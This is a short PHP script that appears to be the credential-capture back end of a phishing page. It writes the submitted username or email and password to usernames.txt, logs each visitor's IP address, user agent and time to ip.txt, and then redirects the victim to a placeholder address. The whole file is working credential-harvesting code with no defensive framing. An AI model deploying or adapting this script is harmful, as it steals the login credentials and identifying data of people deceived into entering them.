<?php
include 'ip.php';
file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['usernameOrEmail'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
$file = fopen("ip.txt" , "a+");
$IP_ADRES = $_SERVER["REMOTE_ADDR"];
$browser = $_SERVER["HTTP_USER_AGENT"];
$Date = time();
$Save = $IP_ADRES."\t".$browser."\t".$Date."\n";
fwrite($file, $Save);
while ($re = fgets($file)) {
      echo $re."<br />";
}
header('Location: <CUSTOM>');
exit();
